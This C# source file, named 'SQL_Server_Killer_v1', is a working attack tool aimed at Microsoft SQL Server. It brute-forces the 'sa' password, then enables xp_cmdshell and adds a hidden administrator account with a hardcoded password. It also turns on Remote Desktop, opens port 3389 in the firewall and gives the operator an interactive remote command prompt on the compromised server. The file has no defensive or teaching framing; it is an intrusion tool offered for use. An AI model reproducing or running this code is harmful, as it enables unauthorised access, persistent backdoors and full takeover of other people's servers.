using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Text;

namespace SQL_Server_Killer_v1
{
    class Exploit : IResultObserver
    {
        static IResultObserver _resultObserver = null;

        public static string[] ExploitationCommands = new string[] { 
            "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE",
            "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE",
            "EXEC master..xp_cmdshell 'net user /add Ch3rn0by1 lafangoo'",
            "EXEC master..xp_cmdshell 'net localgroup administrators Ch3rn0by1 /add'",
            "EXEC master..xp_cmdshell 'reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'",
            "EXEC master..xp_cmdshell 'reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v allowTSConnections /t REG_DWORD /d 0x1 /f'",
            "EXEC master..xp_cmdshell 'netsh firewall add portopening TCP 3389 \"Remote Desktop\"'",
            "EXEC master..xp_cmdshell 'netsh advfirewall firewall add rule name=\"xrummyx\" dir=in action=allow protocol=TCP localport=3389'",
            "EXEC master..xp_cmdshell 'sc config TermService start=auto'",
            "EXEC master..xp_cmdshell 'net start Termservice'"
        };

        private string message = null;

        public Exploit()
        {
            if (_resultObserver == null)
                _resultObserver = this;
        }


        public string executeCommand(string connString, string command)
        {
            message = null;
            try
            {
                using (SqlConnection conn = new SqlConnection(connString))
                {
                    conn.InfoMessage += conn_InfoMessage;
                    using (SqlCommand comm = new SqlCommand(command, conn))
                    {
                        conn.Open();
                        comm.ExecuteNonQuery();
                        if (String.IsNullOrEmpty(message))
                            return "Success";
                        else
                            return message;
                    }
                }
            }
            catch (SqlException ex)
            {
                return ex.Message;
            }
        }

        public DataTable executeCommandWithOutput(string connString, string command)
        {
            DataTable dt = new DataTable();
            try
            {
                using (SqlConnection conn = new SqlConnection(connString))
                {
                    using (SqlCommand comm = new SqlCommand(command, conn))
                    {
                        conn.Open();
                        comm.ExecuteNonQuery();
                        SqlDataAdapter da = new SqlDataAdapter();
                        da.SelectCommand = comm;
                        da.Fill(dt);

                        return dt;
                    }
                }
            }
            catch (SqlException ex)
            {
                return null;
            }
        }

        void conn_InfoMessage(object sender, SqlInfoMessageEventArgs e)
        {
            message = e.Message;
        }

        public static string tryConnect(string ip, string password)
        {
            try
            {
                string connString = "Data Source=[rxr];uid=sa;pwd=[pxp];";

                connString = connString.Replace("[rxr]", ip);
                connString = connString.Replace("[pxp]", password);

                using (SqlConnection conn = new SqlConnection(connString))
                {
                    conn.Open();
                    return "success";
                }
            }
            catch (Exception ex)
            {
                return "fail";
            }
        }

        public void tryConnect(object ipAndPasswordObject)
        {
            string[] ipAndPassword = (string[])ipAndPasswordObject;
            
            string ip = ipAndPassword[0];
            string password = ipAndPassword[1];

            string connString = "Data Source=[rxr];uid=sa;pwd=[pxp];";

            string newConnString = connString.Replace("[rxr]", ip);
            newConnString = newConnString.Replace("[pxp]", password);

            try
            {
                using (SqlConnection conn = new SqlConnection(newConnString))
                {
                    GenericFunctions.logNotification("Trying with username : sa & password : " + password);
                    conn.Open();
                    Program.passwords.RemoveRange(0, Program.passwords.Count);
                    observeResult(true, newConnString);
                    
                }
            }
            catch (Exception ex)
            {
                
            }
        }
   
        public static void subScribeResultObserver(IResultObserver resultObserver)
        {
            _resultObserver = resultObserver;
        }

        public void observeResult(bool result, string connString)
        {
            if (result)
            {
                GenericFunctions.logSuccess("Finalized Connection String is : " + connString);

                Exploit exploit = new Exploit();

                GenericFunctions.logNotification("Starting Exploitation.. Devil Mode ON");

                GenericFunctions.logNotification("Enabling XP_CMD Shell..");

                GenericFunctions.dbResponse(exploit.executeCommand(connString, Exploit.ExploitationCommands[0]));

                GenericFunctions.logNotification("Enabling Automation Procedure..");

                GenericFunctions.dbResponse(exploit.executeCommand(connString, Exploit.ExploitationCommands[1]));

                GenericFunctions.logNotification("Adding user Ch3rn0by1 with password lafangoo..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[2]));

                GenericFunctions.logNotification("Adding user Ch3rn0by1 to Admin Group..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[3]));

                GenericFunctions.logNotification("Enabling Remote Desktop -- Method # 1..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[4]));

                GenericFunctions.logNotification("Enabling Remote Desktop -- Method # 2..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[5]));

                GenericFunctions.logNotification("Adding Remote Desktop Port in Firewall -- Method # 1..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[6]));

                GenericFunctions.logNotification("Adding Remote Desktop Port in Firewall -- Advance Method..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[7]));

                GenericFunctions.logNotification("Configuring Remote Service/Service Manager..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[8]));

                GenericFunctions.logNotification("Restarting Service Manager..");

                GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, Exploit.ExploitationCommands[9]));

                string choice = "x";
                while (choice != "c")
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("Enter CMD Command to Execute on Server\nOR Press c to exit : ");
                    choice = Console.ReadLine().ToLower();
                    if (choice != "c")
                    {
                        choice = "EXEC master..xp_cmdshell'" + choice + "'";
                        GenericFunctions.logDataTable(exploit.executeCommandWithOutput(connString, choice));
                    }
                }
                GenericFunctions.logNotification("Press any key to exit..");
                Console.ReadKey();
            }
        }
    }
}

